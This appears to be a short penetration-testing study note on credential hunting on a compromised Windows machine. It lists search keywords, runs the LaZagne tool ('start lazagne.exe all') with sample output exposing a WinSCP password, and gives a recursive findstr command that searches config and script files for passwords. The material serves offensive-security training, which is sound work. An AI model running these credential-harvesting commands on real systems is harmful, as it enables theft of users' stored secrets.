# Credential Hunting in Windows

Once we have access to a target Windows machine through the GUI or CLI we can look for credentials

With access to the GUI, it is worth attempting to use `Windows Search` to find files on the target using some keywords. Here are some keywords worth looking for:

| Passwords     | Passphrases  | Keys        |
| ------------- | ------------ | ----------- |
| Username      | User account | Creds       |
| Users         | Passkeys     | Passphrases |
| configuration | dbcredential | dbpassword  |
| pwd           | Login        | Credentials |

<figure><img src="../../../../.gitbook/assets/image (1459).png" alt=""><figcaption></figcaption></figure>

We can also use a tool called [Lazagne](https://github.com/AlessandroZ/LaZagne) to quickly discover credentials that web browsers or other installed applications may insecurely store.

Once Lazagne.exe is on the target, we can open command prompt or PowerShell, navigate to the directory the file was uploaded to, and execute it

```cmd-session
C:\Users\bob\Desktop> start lazagne.exe all
```

And the password would look something like this:

```cmd-session
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


########## User: bob ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: 10.129.202.51
Login: admin
Password: SteveisReallyCool123
Port: 22
```

We can also use [findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr) to search from patterns across many types of files. We can look for our own patterns by modifying this command:

```cmd-session
C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```
